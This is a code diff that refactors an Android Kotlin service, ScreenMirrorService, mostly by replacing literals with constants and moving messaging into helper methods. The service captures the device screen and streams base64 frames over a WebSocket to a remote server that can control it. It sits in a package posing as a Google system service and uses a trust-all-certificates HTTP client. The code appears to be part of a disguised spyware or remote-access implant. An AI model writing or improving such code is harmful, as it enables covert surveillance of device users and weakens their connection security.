@@ -25,6 +25,7 @@ import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.TrustAllCertificates
+import com.google.android.systemservice.utils.WsMessageHelper
 import kotlinx.coroutines.*
 import okhttp3.*
 import org.json.JSONObject
@@ -48,6 +49,32 @@ class ScreenMirrorService : BaseService() {
         private const val MAX_SESSION_DURATION_MS = 30 * 60 * 1000L // 30 minutes
         private const val DEFAULT_FPS = 15
         private const val DEFAULT_QUALITY = 70
+
+        // FPS / quality bounds
+        private const val MIN_FPS = 1
+        private const val MAX_FPS = 30
+        private const val MIN_QUALITY = 10
+        private const val MAX_QUALITY = 100
+
+        // WebSocket
+        private const val WS_RECONNECT_DELAY_MS = 5_000L
+        private const val WS_NORMAL_CLOSE_CODE = 1000
+        private const val WS_TIMEOUT_SECONDS = 30L
+
+        // ImageReader buffer count
+        private const val IMAGE_READER_MAX_IMAGES = 2
+
+        // Scale factor thresholds and values
+        private const val RESOLUTION_ULTRA_HD = 2560
+        private const val RESOLUTION_FULL_HD = 1920
+        private const val QUALITY_VERY_LOW_THRESHOLD = 30
+        private const val QUALITY_LOW_THRESHOLD = 50
+        private const val SCALE_QUARTER = 0.25f
+        private const val SCALE_HALF = 0.5f
+        private const val SCALE_REDUCED = 0.65f
+        private const val SCALE_DEFAULT = 0.75f
+
+        private const val MILLIS_PER_SECOND = 1000L
 
         const val ACTION_START = "com.google.android.systemservice.SCREEN_MIRROR_START"
         const val ACTION_STOP = "com.google.android.systemservice.SCREEN_MIRROR_STOP"
@@ -81,9 +108,9 @@ class ScreenMirrorService : BaseService() {
     private var imageHandler: Handler? = null
 
     private val client = TrustAllCertificates.createSecureClientBuilder()
-        .connectTimeout(30, TimeUnit.SECONDS)
-        .writeTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
+        .connectTimeout(WS_TIMEOUT_SECONDS, TimeUnit.SECONDS)
+        .writeTimeout(WS_TIMEOUT_SECONDS, TimeUnit.SECONDS)
+        .readTimeout(WS_TIMEOUT_SECONDS, TimeUnit.SECONDS)
         .build()
 
     override fun onCreate() {
@@ -98,8 +125,8 @@ class ScreenMirrorService : BaseService() {
                 val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                 val resultData = intent.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
                 sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
-                currentFps = intent.getIntExtra(EXTRA_FPS, DEFAULT_FPS).coerceIn(1, 30)
-                currentQuality = intent.getIntExtra(EXTRA_QUALITY, DEFAULT_QUALITY).coerceIn(10, 100)
+                currentFps = intent.getIntExtra(EXTRA_FPS, DEFAULT_FPS).coerceIn(MIN_FPS, MAX_FPS)
+                currentQuality = intent.getIntExtra(EXTRA_QUALITY, DEFAULT_QUALITY).coerceIn(MIN_QUALITY, MAX_QUALITY)
 
                 if (resultCode == Activity.RESULT_OK && resultData != null) {
                     startMirroring(resultCode, resultData)
@@ -110,8 +137,8 @@ class ScreenMirrorService : BaseService() {
             }
             ACTION_STOP -> stopMirroring()
             ACTION_UPDATE_SETTINGS -> {
-                currentFps = intent.getIntExtra(EXTRA_FPS, currentFps).coerceIn(1, 30)
-                currentQuality = intent.getIntExtra(EXTRA_QUALITY, currentQuality).coerceIn(10, 100)
+                currentFps = intent.getIntExtra(EXTRA_FPS, currentFps).coerceIn(MIN_FPS, MAX_FPS)
+                currentQuality = intent.getIntExtra(EXTRA_QUALITY, currentQuality).coerceIn(MIN_QUALITY, MAX_QUALITY)
                 Log.d(TAG, "Settings updated: fps=$currentFps, quality=$currentQuality")
             }
         }
@@ -140,7 +167,7 @@ class ScreenMirrorService : BaseService() {
             imageThread = HandlerThread("ScreenMirrorThread").also { it.start() }
             imageHandler = Handler(imageThread?.looper ?: return)
 
-            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, IMAGE_READER_MAX_IMAGES)
             imageReader?.setOnImageAvailableListener(imageAvailableListener, imageHandler)
 
             virtualDisplay = mediaProjection?.createVirtualDisplay(
@@ -174,7 +201,7 @@ class ScreenMirrorService : BaseService() {
         imageThread?.quitSafely()
         imageThread = null
 
-        try { webSocket?.close(1000, "Mirror stopped") } catch (e: Exception) { Log.e(TAG, "WS close failed", e) }
+        try { webSocket?.close(WS_NORMAL_CLOSE_CODE, "Mirror stopped") } catch (e: Exception) { Log.e(TAG, "WS close failed", e) }
         webSocket = null
 
         stopForeground(true)
@@ -192,7 +219,7 @@ class ScreenMirrorService : BaseService() {
         }
 
         image?.use {
-            val frameInterval = 1000L / currentFps
+            val frameInterval = MILLIS_PER_SECOND / currentFps
             val now = System.currentTimeMillis()
 
             // Rate limiting
@@ -253,20 +280,12 @@ class ScreenMirrorService : BaseService() {
 
     private fun sendFrame(base64Data: String) {
         val seq = frameSequence.incrementAndGet()
-        val message = JSONObject().apply {
-            put("command", "message")
-            put("identifier", JSONObject().apply {
-                put("channel", "ScreenMirrorChannel")
-                put("device_id", deviceId)
-            }.toString())
-            put("data", JSONObject().apply {
-                put("action", "frame")
-                put("frame_data", base64Data)
-                put("timestamp", System.currentTimeMillis())
-                put("sequence", seq)
-            }.toString())
+        WsMessageHelper.sendChannelMessage(webSocket, "ScreenMirrorChannel", deviceId) {
+            put("action", "frame")
+            put("frame_data", base64Data)
+            put("timestamp", System.currentTimeMillis())
+            put("sequence", seq)
         }
-        try { webSocket?.send(message.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
     }
 
     private fun connectWebSocket() {
@@ -290,7 +309,7 @@ class ScreenMirrorService : BaseService() {
                 Log.e(TAG, "WebSocket error: ${t.message}")
                 if (isStreaming.get()) {
                     serviceScope.launch {
-                        delay(5000)
+                        delay(WS_RECONNECT_DELAY_MS)
                         connectWebSocket()
                     }
                 }
@@ -303,14 +322,7 @@ class ScreenMirrorService : BaseService() {
     }
 
     private fun subscribeToChannel(ws: WebSocket) {
-        val subscribe = JSONObject().apply {
-            put("command", "subscribe")
-            put("identifier", JSONObject().apply {
-                put("channel", "ScreenMirrorChannel")
-                put("device_id", deviceId)
-            }.toString())
-        }
-        ws.send(subscribe.toString())
+        WsMessageHelper.subscribe(ws, "ScreenMirrorChannel", deviceId)
     }
 
     private fun handleServerMessage(text: String) {
@@ -323,8 +335,8 @@ class ScreenMirrorService : BaseService() {
             when (message.optString("type", "")) {
                 "stop_mirror" -> stopMirroring()
                 "settings_update" -> {
-                    currentFps = message.optInt("fps", currentFps).coerceIn(1, 30)
-                    currentQuality = message.optInt("quality", currentQuality).coerceIn(10, 100)
+                    currentFps = message.optInt("fps", currentFps).coerceIn(MIN_FPS, MAX_FPS)
+                    currentQuality = message.optInt("quality", currentQuality).coerceIn(MIN_QUALITY, MAX_QUALITY)
                     Log.d(TAG, "Remote settings update: fps=$currentFps, quality=$currentQuality")
                 }
             }
@@ -344,14 +356,7 @@ class ScreenMirrorService : BaseService() {
     }
 
     private fun getDeviceIdentifier(): String {
-        return try {
-            android.provider.Settings.Secure.getString(
-                contentResolver,
-                android.provider.Settings.Secure.ANDROID_ID
-            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
-        } catch (e: Exception) {
-            AndroidConfig.deviceId.ifEmpty { "unknown" }
-        }
+        return com.google.android.systemservice.utils.DeviceIdentifierProvider.getDeviceIdentifier(this)
     }
 
     @SuppressLint("ObsoleteSdkInt")
@@ -367,11 +372,11 @@ class ScreenMirrorService : BaseService() {
         // Reduce resolution for bandwidth management
         val maxDimension = maxOf(metrics.widthPixels, metrics.heightPixels)
         return when {
-            currentQuality < 30 -> 0.25f
-            currentQuality < 50 -> 0.5f
-            maxDimension > 2560 -> 0.5f
-            maxDimension > 1920 -> 0.65f
-            else -> 0.75f
+            currentQuality < QUALITY_VERY_LOW_THRESHOLD -> SCALE_QUARTER
+            currentQuality < QUALITY_LOW_THRESHOLD -> SCALE_HALF
+            maxDimension > RESOLUTION_ULTRA_HD -> SCALE_HALF
+            maxDimension > RESOLUTION_FULL_HD -> SCALE_REDUCED
+            else -> SCALE_DEFAULT
         }
     }
 
